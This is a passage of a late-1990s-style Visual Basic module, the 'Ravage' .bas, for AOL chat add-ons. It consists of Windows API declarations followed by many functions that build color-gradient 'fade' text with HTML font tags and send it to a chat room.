Attribute VB_Name = "Ravage"
'******************************
'             RaVaGe bas
'******************************
'         Werds from RaVaGe
'Sup all this is my first bas
'file it has 371 subs and functions
'in it ,Just about anything u
'will ever need to make a great
'prog . There are examples and
'help in the bas on alot of the
'subs so it is easy for u to succed
'in makin an awsome prog
'some of the shit in my bas was
'takin outta other bas files and
'they were givin credit for it
'If u wanna use shit from my bas
'to make your own make sure u do
'the same for me .... If u need
'any help with this bas or have
'any ideas of shit that can be
'added e-mail me at
'RaVaGeVbX@aol.com
'_____________________________
' ***** *****   *   ****  ****
' * * * *      * *  *     *
' ***** *****  ***  *     ****
' *     *      * *  *     *
' *     *****  * *  ****  *****
'_____________________________
Declare Function IsWindowEnabled Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hWnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hWnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hWnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hWnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hWnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hWnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hWnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hWnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hWnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hWnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long

Declare Function EnableWindow Lib "user32" (ByVal hWnd As Long, ByVal cmd As Long) As Long

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230


Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
End Type
'Pre-set 2 color fade combinations begin here
Sub BoldFadeBlack(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    L$ = Mid$(thetext, W + 5, 1)
    F$ = Mid$(thetext, W + 6, 1)
    B$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    H$ = Mid$(thetext, W + 10, 1)
    J$ = Mid$(thetext, W + 11, 1)
    k$ = Mid$(thetext, W + 12, 1)
    m$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000000>" & ab$ & "<FONT COLOR=#111111>" & U$ & "<FONT COLOR=#222222>" & S$ & "<FONT COLOR=#333333>" & T$ & "<FONT COLOR=#444444>" & Y$ & "<FONT COLOR=#555555>" & L$ & "<FONT COLOR=#666666>" & F$ & "<FONT COLOR=#777777>" & B$ & "<FONT COLOR=#888888>" & c$ & "<FONT COLOR=#999999>" & D$ & "<FONT COLOR=#888888>" & H$ & "<FONT COLOR=#777777>" & J$ & "<FONT COLOR=#666666>" & k$ & "<FONT COLOR=#555555>" & m$ & "<FONT COLOR=#444444>" & n$ & "<FONT COLOR=#333333>" & Q$ & "<FONT COLOR=#222222>" & V$ & "<FONT COLOR=#111111>" & Z$
Next W
SendChat (PC$)
'Code for the room shit will be
'Call Fadeblack(Text1.text)


'to make any of the subs werk in ims
'You will need 2 text boxes and a button
'Do the change below and copy that to your send button
   ' a = Len(Text2.text)
    'For B = 1 To a
        'c = Left(Text2.text, B)
        'D = Right(c, 1)
        'e = 255 / a
        'F = e * B
        'G = RGB(F, 0, 0)
        'H = RGBtoHEX(G)
    ' Dim msg
    ' msg=msg & "<B><Font Color=#" & H & ">" & D
    'Next B
   ' Call IMKeyword(Text1.text, msg)
'u can do it for mail too but
'that is harder and I will leave that to u
'to figure out
End Sub
Sub BoldFadeGreen(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    L$ = Mid$(thetext, W + 5, 1)
    F$ = Mid$(thetext, W + 6, 1)
    B$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    H$ = Mid$(thetext, W + 10, 1)
    J$ = Mid$(thetext, W + 11, 1)
    k$ = Mid$(thetext, W + 12, 1)
    m$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#001100>" & ab$ & "<FONT COLOR=#002200>" & U$ & "<FONT COLOR=#003300>" & S$ & "<FONT COLOR=#004400>" & T$ & "<FONT COLOR=#005500>" & Y$ & "<FONT COLOR=#006600>" & L$ & "<FONT COLOR=#007700>" & F$ & "<FONT COLOR=#008800>" & B$ & "<FONT COLOR=#009900>" & c$ & "<FONT COLOR=#00FF00>" & D$ & "<FONT COLOR=#009900>" & H$ & "<FONT COLOR=#008800>" & J$ & "<FONT COLOR=#007700>" & k$ & "<FONT COLOR=#006600>" & m$ & "<FONT COLOR=#005500>" & n$ & "<FONT COLOR=#004400>" & Q$ & "<FONT COLOR=#003300>" & V$ & "<FONT COLOR=#002200>" & Z$
Next W
SendChat (PC$)
End Sub
Sub BoldFadeRed(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    L$ = Mid$(thetext, W + 5, 1)
    F$ = Mid$(thetext, W + 6, 1)
    B$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    H$ = Mid$(thetext, W + 10, 1)
    J$ = Mid$(thetext, W + 11, 1)
    k$ = Mid$(thetext, W + 12, 1)
    m$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#990000>" & U$ & "<FONT COLOR=#880000>" & S$ & "<FONT COLOR=#770000>" & T$ & "<FONT COLOR=#660000>" & Y$ & "<FONT COLOR=#550000>" & L$ & "<FONT COLOR=#440000>" & F$ & "<FONT COLOR=#330000>" & B$ & "<FONT COLOR=#220000>" & c$ & "<FONT COLOR=#110000>" & D$ & "<FONT COLOR=#220000>" & H$ & "<FONT COLOR=#330000>" & J$ & "<FONT COLOR=#440000>" & k$ & "<FONT COLOR=#550000>" & m$ & "<FONT COLOR=#660000>" & n$ & "<FONT COLOR=#770000>" & Q$ & "<FONT COLOR=#880000>" & V$ & "<FONT COLOR=#990000>" & Z$
Next W
SendChat (PC$)


End Sub
Sub BoldFadeBlue(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    L$ = Mid$(thetext, W + 5, 1)
    F$ = Mid$(thetext, W + 6, 1)
    B$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    H$ = Mid$(thetext, W + 10, 1)
    J$ = Mid$(thetext, W + 11, 1)
    k$ = Mid$(thetext, W + 12, 1)
    m$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000019>" & ab$ & "<FONT COLOR=#000026>" & U$ & "<FONT COLOR=#00003F>" & S$ & "<FONT COLOR=#000058>" & T$ & "<FONT COLOR=#000072>" & Y$ & "<FONT COLOR=#00008B>" & L$ & "<FONT COLOR=#0000A5>" & F$ & "<FONT COLOR=#0000BE>" & B$ & "<FONT COLOR=#0000D7>" & c$ & "<FONT COLOR=#0000F1>" & D$ & "<FONT COLOR=#0000D7>" & H$ & "<FONT COLOR=#0000BE>" & J$ & "<FONT COLOR=#0000A5>" & k$ & "<FONT COLOR=#00008B>" & m$ & "<FONT COLOR=#000072>" & n$ & "<FONT COLOR=#000058>" & Q$ & "<FONT COLOR=#00003F>" & V$ & "<FONT COLOR=#000026>" & Z$
Next W
SendChat (PC$)

End Sub

Sub BoldFadeYellow(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    L$ = Mid$(thetext, W + 5, 1)
    F$ = Mid$(thetext, W + 6, 1)
    B$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    H$ = Mid$(thetext, W + 10, 1)
    J$ = Mid$(thetext, W + 11, 1)
    k$ = Mid$(thetext, W + 12, 1)
    m$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FFFF00>" & ab$ & "<FONT COLOR=#999900>" & U$ & "<FONT COLOR=#888800>" & S$ & "<FONT COLOR=#777700>" & T$ & "<FONT COLOR=#666600>" & Y$ & "<FONT COLOR=#555500>" & L$ & "<FONT COLOR=#444400>" & F$ & "<FONT COLOR=#333300>" & B$ & "<FONT COLOR=#222200>" & c$ & "<FONT COLOR=#111100>" & D$ & "<FONT COLOR=#222200>" & H$ & "<FONT COLOR=#333300>" & J$ & "<FONT COLOR=#444400>" & k$ & "<FONT COLOR=#555500>" & m$ & "<FONT COLOR=#666600>" & n$ & "<FONT COLOR=#777700>" & Q$ & "<FONT COLOR=#888800>" & V$ & "<FONT COLOR=#999900>" & Z$
Next W
SendChat (PC$)

End Sub


Function BoldBlackBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)

End Function

Function BoldBlackGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldBlackGrey(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 220 / A
        F = e * B
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldBlackPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldBlackRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldBlackYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldBlueBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldBlueGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldBluePurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldBlueRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldBlueYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldGreenBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldGreenBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldGreenPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldGreenRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldGreenYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function

Function BoldGreyBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 220 / A
        F = e * B
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldGreyBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldGreyGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldGreyPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldGreyRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldGreyYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPurpleBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPurpleBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldPurpleGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPurpleRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPurpleYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldRedBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldRedBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldRedGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldRedPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldRedYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
